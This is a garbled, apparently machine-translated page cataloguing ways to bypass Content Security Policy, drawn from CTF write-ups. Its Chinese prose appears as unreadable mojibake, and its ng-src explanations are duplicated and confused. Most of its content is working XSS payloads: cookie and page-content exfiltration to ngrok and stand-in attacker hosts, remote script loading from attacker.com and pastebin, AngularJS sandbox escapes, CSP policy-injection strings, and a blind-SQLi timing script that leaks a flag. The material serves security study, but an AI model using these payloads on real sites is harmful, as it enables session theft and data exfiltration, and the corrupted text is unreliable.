æ ¹æ®[**è¿™ç¯‡CTFè§£é¢˜æŠ¥å‘Š**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves)ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨[https://www.google.com/recaptcha/](https://www.google.com/recaptcha/)åœ¨CSPä¸­æ‰§è¡Œä»»æ„JSä»£ç ï¼Œç»•è¿‡CSPé™åˆ¶ï¼š
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### ç¬¬ä¸‰æ–¹ç«¯ç‚¹ + JSONP

JSONPï¼ˆJSON with Paddingï¼‰æ˜¯ä¸€ç§ç»•è¿‡å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰é™åˆ¶çš„æŠ€æœ¯ã€‚CSPæ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºé˜²æ­¢è·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œå…¶ä»–æ¶æ„è¡Œä¸ºã€‚ç„¶è€Œï¼Œé€šè¿‡ä½¿ç”¨JSONPï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡CSPé™åˆ¶å¹¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚

JSONPåˆ©ç”¨äº†æµè§ˆå™¨å¯¹`<script>`æ ‡ç­¾çš„ä¿¡ä»»ï¼Œå…è®¸ä»ä¸åŒåŸŸçš„æœåŠ¡å™¨åŠ è½½è„šæœ¬ã€‚æ”»å‡»è€…å¯ä»¥å°†æ¶æ„ä»£ç åµŒå…¥åˆ°JSONPå“åº”ä¸­ï¼Œå¹¶é€šè¿‡åŠ¨æ€åˆ›å»º`<script>`æ ‡ç­¾æ¥æ‰§è¡Œè¯¥ä»£ç ã€‚

è¦åˆ©ç”¨JSONPç»•è¿‡CSPï¼Œæ”»å‡»è€…éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå…è®¸ä½¿ç”¨JSONPçš„ç¬¬ä¸‰æ–¹ç«¯ç‚¹ã€‚è¿™ä¸ªç«¯ç‚¹åº”è¯¥æ¥å—ä¸€ä¸ªå›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶å°†æ¶æ„ä»£ç ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°è¿”å›ã€‚

ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œæ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨JSONPç»•è¿‡CSPé™åˆ¶ï¼š

```html
<script>
  function handleResponse(data) {
    // åœ¨è¿™é‡Œæ‰§è¡Œæ¶æ„ä»£ç 
  }
</script>

<script src="https://third-party.com/endpoint?callback=handleResponse"></script>
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œ`handleResponse`å‡½æ•°å°†ä½œä¸ºå›è°ƒå‡½æ•°ä¼ é€’ç»™ç¬¬ä¸‰æ–¹ç«¯ç‚¹ã€‚è¯¥ç«¯ç‚¹å°†è¿”å›ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„å“åº”ï¼Œå¹¶å°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™å›è°ƒå‡½æ•°ã€‚è¿™æ ·ï¼Œæ¶æ„ä»£ç å°†åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œç»•è¿‡äº†CSPé™åˆ¶ã€‚

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒJSONPå­˜åœ¨å®‰å…¨é£é™©ï¼Œå¹¶ä¸”å·²ç»è¢«è®¸å¤šç°ä»£æµè§ˆå™¨ç¦ç”¨ã€‚å› æ­¤ï¼Œä½œä¸ºå®‰å…¨ä¸“ä¸šäººå‘˜ï¼Œæˆ‘ä»¬åº”è¯¥é¿å…ä½¿ç”¨JSONPï¼Œå¹¶ä½¿ç”¨æ›´å®‰å…¨çš„æ›¿ä»£æ–¹æ¡ˆæ¥ä¿æŠ¤åº”ç”¨ç¨‹åºå…å—æ”»å‡»ã€‚
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
åƒè¿™æ ·çš„æƒ…å†µï¼Œ`script-src`è¢«è®¾ç½®ä¸º`self`å’Œä¸€ä¸ªç‰¹å®šçš„åŸŸåï¼Œè¯¥åŸŸåè¢«åˆ—å…¥ç™½åå•ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨JSONPæ¥ç»•è¿‡ã€‚JSONPç«¯ç‚¹å…è®¸ä½¿ç”¨ä¸å®‰å…¨çš„å›è°ƒæ–¹æ³•ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥æ‰§è¡ŒXSSæ”»å‡»ï¼Œæœ‰æ•ˆè½½è·å¦‚ä¸‹ï¼š

```html
<script src="https://attacker.com/evil.js"></script>
```

æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„çš„JavaScriptæ–‡ä»¶ï¼ˆ`evil.js`ï¼‰ï¼Œå¹¶å°†å…¶ä½œä¸ºè„šæœ¬æºï¼ˆ`src`ï¼‰æ³¨å…¥åˆ°å—å½±å“çš„ç½‘é¡µä¸­ã€‚è¿™æ ·ï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„çš„æ¶æ„ä»£ç ã€‚
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **åŒ…å«äº†ç”¨äºç»•è¿‡ä¸åŒç½‘ç«™çš„CSPçš„JSONPç«¯ç‚¹ã€‚**

å¦‚æœ**å—ä¿¡ä»»çš„ç«¯ç‚¹åŒ…å«ä¸€ä¸ªå¼€æ”¾é‡å®šå‘**ï¼Œé‚£ä¹ˆå°†ä¼šå‡ºç°ç›¸åŒçš„æ¼æ´ï¼Œå› ä¸ºå¦‚æœåˆå§‹ç«¯ç‚¹æ˜¯å—ä¿¡ä»»çš„ï¼Œé‚£ä¹ˆé‡å®šå‘ä¹Ÿæ˜¯å—ä¿¡ä»»çš„ã€‚

### æ–‡ä»¶å¤¹è·¯å¾„ç»•è¿‡

å¦‚æœCSPç­–ç•¥æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”ä½ ä½¿ç”¨**%2f**æ¥ç¼–ç **"/"**ï¼Œå®ƒä»ç„¶è¢«è®¤ä¸ºæ˜¯åœ¨æ–‡ä»¶å¤¹å†…éƒ¨ã€‚æ‰€æœ‰æµè§ˆå™¨ä¼¼ä¹éƒ½åŒæ„è¿™ä¸€ç‚¹ã€‚\
è¿™å¯¼è‡´äº†ä¸€ä¸ªå¯èƒ½çš„ç»•è¿‡æ–¹å¼ï¼Œé€šè¿‡ä½¿ç”¨"**%2f..%2f**"ï¼Œå¦‚æœæœåŠ¡å™¨è§£ç å®ƒçš„è¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœCSPå…è®¸`http://example.com/company/`ï¼Œä½ å¯ä»¥ç»•è¿‡æ–‡ä»¶å¤¹é™åˆ¶å¹¶æ‰§è¡Œï¼š`http://example.com/company%2f..%2fattacker/file.js`

åœ¨çº¿ç¤ºä¾‹ï¼š[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JSæ‰§è¡Œ

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### ç¼ºå°‘**base-uri**

å¦‚æœç¼ºå°‘**base-uri**æŒ‡ä»¤ï¼Œä½ å¯ä»¥æ»¥ç”¨å®ƒæ¥æ‰§è¡Œ[**æ‚¬æŒ‚æ ‡è®°æ³¨å…¥**](../dangling-markup-html-scriptless-injection/)ã€‚

æ­¤å¤–ï¼Œå¦‚æœé¡µé¢ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼ˆå¦‚`/js/app.js`ï¼‰åŠ è½½è„šæœ¬ï¼Œå¹¶ä½¿ç”¨**Nonce**ï¼Œä½ å¯ä»¥æ»¥ç”¨**base** **tag**æ¥ä½¿å…¶ä»**ä½ è‡ªå·±çš„æœåŠ¡å™¨åŠ è½½**è„šæœ¬ï¼Œä»è€Œå®ç°XSSã€‚\
å¦‚æœæ˜“å—æ”»å‡»çš„é¡µé¢ä½¿ç”¨**httpS**åŠ è½½ï¼Œè¯·ä½¿ç”¨ä¸€ä¸ªhttpSçš„URLã€‚
```html
<base href="https://www.attacker.com/">
```
### AngularJS äº‹ä»¶

æ ¹æ®å…·ä½“çš„ç­–ç•¥ï¼ŒCSPä¼šé˜»æ­¢JavaScriptäº‹ä»¶ã€‚ç„¶è€Œï¼ŒAngularJSå®šä¹‰äº†è‡ªå·±çš„äº‹ä»¶ï¼Œå¯ä»¥ä»£æ›¿ä½¿ç”¨ã€‚å½“åœ¨äº‹ä»¶å†…éƒ¨æ—¶ï¼ŒAngularJSå®šä¹‰äº†ä¸€ä¸ªç‰¹æ®Šçš„`$event`å¯¹è±¡ï¼Œå®ƒç®€å•åœ°å¼•ç”¨æµè§ˆå™¨äº‹ä»¶å¯¹è±¡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ­¤å¯¹è±¡æ¥æ‰§è¡ŒCSPç»•è¿‡ã€‚åœ¨Chromeä¸Šï¼Œ`$event/event`å¯¹è±¡ä¸Šæœ‰ä¸€ä¸ªç‰¹æ®Šçš„å±æ€§å«åš`path`ã€‚è¯¥å±æ€§åŒ…å«ä¸€ä¸ªå¯¹è±¡æ•°ç»„ï¼Œå¯¼è‡´äº‹ä»¶è¢«æ‰§è¡Œã€‚æœ€åä¸€ä¸ªå±æ€§å§‹ç»ˆæ˜¯`window`å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥æ‰§è¡Œæ²™ç›’é€ƒé€¸ã€‚é€šè¿‡å°†æ­¤æ•°ç»„ä¼ é€’ç»™`orderBy`è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥æšä¸¾æ•°ç»„å¹¶ä½¿ç”¨æœ€åä¸€ä¸ªå…ƒç´ ï¼ˆ`window`å¯¹è±¡ï¼‰æ¥æ‰§è¡Œå…¨å±€å‡½æ•°ï¼Œä¾‹å¦‚`alert()`ã€‚ä»¥ä¸‹ä»£ç æ¼”ç¤ºäº†è¿™ä¸€ç‚¹ï¼š
```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
**åœ¨** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **ä¸­æŸ¥æ‰¾å…¶ä»–Angularç»•è¿‡æ–¹æ³•**

### AngularJSå’Œç™½åå•åŸŸå

```html
<iframe src="https://www.youtube.com/embed/abcdefghijk" ng-src="{{trustedUrl}}"></iframe>
```

This bypasses the AngularJS `ng-src` directive by using a hardcoded URL in the `src` attribute and the AngularJS expression `{{trustedUrl}}` in the `ng-src` attribute. The `trustedUrl` variable is expected to be a trusted URL that has been whitelisted by the application.

è¿™ç§æ–¹æ³•é€šè¿‡åœ¨`src`å±æ€§ä¸­ä½¿ç”¨ç¡¬ç¼–ç çš„URLå’Œåœ¨`ng-src`å±æ€§ä¸­ä½¿ç”¨AngularJSè¡¨è¾¾å¼`{{trustedUrl}}`æ¥ç»•è¿‡AngularJSçš„`ng-src`æŒ‡ä»¤ã€‚`trustedUrl`å˜é‡åº”è¯¥æ˜¯åº”ç”¨ç¨‹åºå·²ç»å°†å…¶åˆ—å…¥ç™½åå•çš„å¯ä¿¡ä»»URLã€‚

```html
<img src="https://www.example.com/image.jpg" ng-src="{{trustedUrl}}">
```

This bypasses the AngularJS `ng-src` directive by using a hardcoded URL in the `src` attribute and the AngularJS expression `{{trustedUrl}}` in the `ng-src` attribute. The `trustedUrl` variable is expected to be a trusted URL that has been whitelisted by the application.

è¿™ç§æ–¹æ³•é€šè¿‡åœ¨`src`å±æ€§ä¸­ä½¿ç”¨ç¡¬ç¼–ç çš„URLå’Œåœ¨`ng-src`å±æ€§ä¸­ä½¿ç”¨AngularJSè¡¨è¾¾å¼`{{trustedUrl}}`æ¥ç»•è¿‡AngularJSçš„`ng-src`æŒ‡ä»¤ã€‚`trustedUrl`å˜é‡åº”è¯¥æ˜¯åº”ç”¨ç¨‹åºå·²ç»å°†å…¶åˆ—å…¥ç™½åå•çš„å¯ä¿¡ä»»URLã€‚
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
å¦‚æœåº”ç”¨ç¨‹åºä½¿ç”¨Angular JSï¼Œå¹¶ä¸”è„šæœ¬æ˜¯ä»ç™½åå•åŸŸåŠ è½½çš„ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è°ƒç”¨å›è°ƒå‡½æ•°å’Œæ˜“å—æ”»å‡»çš„ç±»æ¥ç»•è¿‡æ­¤CSPç­–ç•¥ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·è®¿é—®è¿™ä¸ªå¾ˆæ£’çš„[git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22)å­˜å‚¨åº“ã€‚

æœ‰æ•ˆè½½è·ç¤ºä¾‹ï¼š
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
å…¶ä»–JSONPä»»æ„æ‰§è¡Œç«¯ç‚¹å¯ä»¥åœ¨[**è¿™é‡Œ**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)æ‰¾åˆ°ï¼ˆå…¶ä¸­ä¸€äº›å·²è¢«åˆ é™¤æˆ–ä¿®å¤ï¼‰ã€‚

### ä½¿ç”¨æ‚¬æŒ‚æ ‡è®°ç»•è¿‡CSP

è¯·é˜…è¯»[æ­¤å¤„](../dangling-markup-html-scriptless-injection/)äº†è§£è¯¦æƒ…ã€‚

### 'unsafe-inline'; img-src \*; é€šè¿‡XSSç»•è¿‡CSP
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` è¡¨ç¤ºå¯ä»¥åœ¨ä»£ç ä¸­æ‰§è¡Œä»»ä½•è„šæœ¬ï¼ˆXSS å¯ä»¥æ‰§è¡Œä»£ç ï¼‰ï¼Œ`img-src *` è¡¨ç¤ºå¯ä»¥åœ¨ç½‘é¡µä¸­ä½¿ç”¨æ¥è‡ªä»»ä½•èµ„æºçš„ä»»ä½•å›¾åƒã€‚

æ‚¨å¯ä»¥é€šè¿‡å›¾åƒå°†æ•°æ®æ³„éœ²æ¥ç»•è¿‡æ­¤ CSPï¼ˆåœ¨æ­¤æƒ…å†µä¸‹ï¼ŒXSS æ»¥ç”¨äº† CSRFï¼Œå…¶ä¸­æœºå™¨äººå¯ä»¥è®¿é—®çš„é¡µé¢åŒ…å« SQLiï¼Œå¹¶é€šè¿‡å›¾åƒæå–æ ‡å¿—ï¼‰ï¼š
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
ä»ï¼š[https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

æ‚¨è¿˜å¯ä»¥æ»¥ç”¨æ­¤é…ç½®æ¥**åŠ è½½æ’å…¥å›¾åƒä¸­çš„JavaScriptä»£ç **ã€‚ä¾‹å¦‚ï¼Œå¦‚æœé¡µé¢å…è®¸ä»TwitteråŠ è½½å›¾åƒï¼Œæ‚¨å¯ä»¥**åˆ¶ä½œ**ä¸€ä¸ª**ç‰¹æ®Šçš„å›¾åƒ**ï¼Œå°†å…¶**ä¸Šä¼ **åˆ°Twitterï¼Œå¹¶æ»¥ç”¨â€œ**unsafe-inline**â€æ¥æ‰§è¡ŒJSä»£ç ï¼ˆä½œä¸ºå¸¸è§„çš„XSSï¼‰ï¼Œè¯¥ä»£ç å°†**åŠ è½½**å›¾åƒï¼Œä»ä¸­**æå–**JSå¹¶**æ‰§è¡Œ**å®ƒï¼š[https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### ä½¿ç”¨Service Workers

Service Workersçš„**`importScripts`**å‡½æ•°ä¸å—CSPé™åˆ¶ï¼š

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### ç­–ç•¥æ³¨å…¥

**ç ”ç©¶ï¼š**[**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

å¦‚æœæ‚¨å‘é€çš„**å‚æ•°**è¢«**ç²˜è´´åˆ°**ç­–ç•¥çš„**å£°æ˜**ä¸­ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥ä»¥æŸç§æ–¹å¼**æ›´æ”¹**ç­–ç•¥ï¼Œä½¿å…¶å˜å¾—**æ— æ•ˆ**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»»ä½•ä¸€ç§ç»•è¿‡æ–¹æ³•æ¥**å…è®¸è„šæœ¬ 'unsafe-inline'**ï¼š
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
å› ä¸ºè¿™ä¸ªæŒ‡ä»¤ä¼š**è¦†ç›–ç°æœ‰çš„script-srcæŒ‡ä»¤**ã€‚\
ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªä¾‹å­ï¼š[http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

åœ¨Edgeä¸­ï¼Œè¿™æ›´ç®€å•ã€‚å¦‚æœä½ å¯ä»¥åœ¨CSPä¸­æ·»åŠ è¿™ä¸ªï¼š**`;_`**ï¼Œ**Edge**ä¼š**ä¸¢å¼ƒ**æ•´ä¸ª**ç­–ç•¥**ã€‚\
ä¾‹å­ï¼š[http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; é€šè¿‡XSSï¼ˆiframeï¼‰è¿›è¡Œæ—¶é—´æ”»å‡»

æ³¨æ„ç¼ºå°‘æŒ‡ä»¤`'unsafe-inline'`\
è¿™æ¬¡ä½ å¯ä»¥é€šè¿‡**XSS**ä½¿å—å®³è€…åœ¨**ä½ çš„æ§åˆ¶ä¸‹**åŠ è½½ä¸€ä¸ªé¡µé¢ï¼Œä½¿ç”¨`<iframe`ã€‚è¿™æ¬¡ä½ å°†è®©å—å®³è€…è®¿é—®ä½ æƒ³è¦æå–ä¿¡æ¯ï¼ˆ**CSRF**ï¼‰çš„é¡µé¢ã€‚ä½ æ— æ³•è®¿é—®é¡µé¢çš„å†…å®¹ï¼Œä½†å¦‚æœä½ å¯ä»¥**æ§åˆ¶é¡µé¢åŠ è½½æ‰€éœ€çš„æ—¶é—´**ï¼Œä½ å°±å¯ä»¥æå–æ‰€éœ€çš„ä¿¡æ¯ã€‚

è¿™æ¬¡å°†æå–ä¸€ä¸ª**æ ‡å¿—**ï¼Œæ¯å½“é€šè¿‡SQLi**æ­£ç¡®çŒœæµ‹ä¸€ä¸ªå­—ç¬¦**æ—¶ï¼Œç”±äºä¼‘çœ å‡½æ•°ï¼Œ**å“åº”æ—¶é—´**ä¼šå˜é•¿ã€‚ç„¶åï¼Œä½ å°†èƒ½å¤Ÿæå–æ ‡å¿—ï¼š
```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### é€šè¿‡ä¹¦ç­¾å·¥å…·

è¿™ç§æ”»å‡»éœ€è¦ä¸€äº›ç¤¾äº¤å·¥ç¨‹ï¼Œæ”»å‡»è€…ä¼š**è¯´æœç”¨æˆ·å°†é“¾æ¥æ‹–æ”¾åˆ°æµè§ˆå™¨çš„ä¹¦ç­¾å·¥å…·ä¸Š**ã€‚è¿™ä¸ªä¹¦ç­¾å·¥å…·ä¼šåŒ…å«**æ¶æ„çš„ JavaScript ä»£ç **ï¼Œå½“è¢«æ‹–æ”¾æˆ–ç‚¹å‡»æ—¶ï¼Œä¼šåœ¨å½“å‰ç½‘é¡µçª—å£çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œ**ç»•è¿‡ CSP å¹¶å…è®¸çªƒå–æ•æ„Ÿä¿¡æ¯**ï¼Œå¦‚ cookies æˆ–ä»¤ç‰Œã€‚

äº†è§£æ›´å¤šä¿¡æ¯ï¼Œè¯·[**æŸ¥çœ‹åŸå§‹æŠ¥å‘Š**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/)ã€‚

### é€šè¿‡é™åˆ¶ CSP ç»•è¿‡

åœ¨[**è¿™ä¸ª CTF è§£ç­”**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution)ä¸­ï¼Œé€šè¿‡åœ¨å…è®¸çš„ iframe ä¸­æ³¨å…¥ä¸€ä¸ªæ›´ä¸¥æ ¼çš„ CSPï¼Œç¦æ­¢åŠ è½½ç‰¹å®šçš„ JS æ–‡ä»¶ï¼Œç„¶åé€šè¿‡**åŸå‹æ±¡æŸ“**æˆ–**DOM ç¯¡æ”¹**æ¥æ»¥ç”¨ä¸åŒçš„è„šæœ¬æ¥åŠ è½½ä»»æ„è„šæœ¬ï¼Œä»è€Œç»•è¿‡äº† CSPã€‚

æ‚¨å¯ä»¥ä½¿ç”¨**`csp`**å±æ€§**é™åˆ¶ iframe çš„ CSP**ï¼š

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

åœ¨[**è¿™ä¸ªCTFè§£ç­”**](https://github.com/aszx87410/ctf-writeups/issues/48)ä¸­ï¼Œé€šè¿‡**HTMLæ³¨å…¥**å¯ä»¥æ›´åŠ **é™åˆ¶**CSPï¼Œä»è€Œç¦ç”¨äº†é˜²æ­¢CSTIçš„è„šæœ¬ï¼Œå› æ­¤**æ¼æ´å˜å¾—å¯åˆ©ç”¨**ã€‚\
å¯ä»¥ä½¿ç”¨**HTMLå…ƒæ ‡ç­¾**ä½¿CSPæ›´åŠ ä¸¥æ ¼ï¼Œå¹¶é€šè¿‡**åˆ é™¤**å…è®¸å…¶**nonce**çš„**å…¥å£**å’Œ**é€šè¿‡shaå¯ç”¨ç‰¹å®šçš„å†…è”è„šæœ¬**æ¥ç¦ç”¨å†…è”è„šæœ¬ï¼š
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### ä½¿ç”¨ Content-Security-Policy-Report-Only è¿›è¡Œ JS æ•°æ®æ³„éœ²

å¦‚æœä½ èƒ½å¤Ÿè®©æœåŠ¡å™¨å“åº”å¤´ä¸­çš„ **`Content-Security-Policy-Report-Only`** çš„å€¼ç”±ä½ æ§åˆ¶ï¼ˆå¯èƒ½æ˜¯å› ä¸º CRLF æ¼æ´ï¼‰ï¼Œä½ å¯ä»¥è®©å®ƒæŒ‡å‘ä½ çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”å¦‚æœä½ ç”¨ **`<script>`** åŒ…è£¹ä½ æƒ³è¦æ³„éœ²çš„ JS å†…å®¹ï¼Œç”±äº CSP å¾ˆå¯èƒ½ä¸å…è®¸ `unsafe-inline`ï¼Œè¿™å°†è§¦å‘ CSP é”™è¯¯ï¼Œå¹¶ä¸”åŒ…å«æ•æ„Ÿä¿¡æ¯çš„è„šæœ¬çš„ä¸€éƒ¨åˆ†å°†ä» `Content-Security-Policy-Report-Only` å‘é€åˆ°æœåŠ¡å™¨ã€‚

ä¾‹å¦‚ï¼Œå¯ä»¥å‚è€ƒ[**è¿™ä¸ª CTF è§£é¢˜æŠ¥å‘Š**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes)ã€‚

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### æ³„éœ²ä¿¡æ¯çš„CSP + iframe

æƒ³è±¡ä¸€ç§æƒ…å†µï¼Œä¸€ä¸ªé¡µé¢æ ¹æ®ç”¨æˆ·ä¸åŒï¼Œå°†é‡å®šå‘åˆ°ä¸€ä¸ªå¸¦æœ‰ç§˜å¯†çš„ä¸åŒé¡µé¢ã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·adminè®¿é—®redirectme.domain1.comä¼šè¢«é‡å®šå‘åˆ°adminsecret321.domain2.comï¼Œä½ å¯ä»¥å¯¹adminè¿›è¡ŒXSSæ”»å‡»ã€‚åŒæ—¶ï¼Œè¢«é‡å®šå‘çš„é¡µé¢ä¸è¢«å®‰å…¨ç­–ç•¥å…è®¸ï¼Œä½†æ˜¯è¿›è¡Œé‡å®šå‘çš„é¡µé¢æ˜¯å…è®¸çš„ã€‚

ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ³„éœ²adminè¢«é‡å®šå‘çš„åŸŸåï¼š

* é€šè¿‡CSPè¿è§„
* é€šè¿‡CSPè§„åˆ™

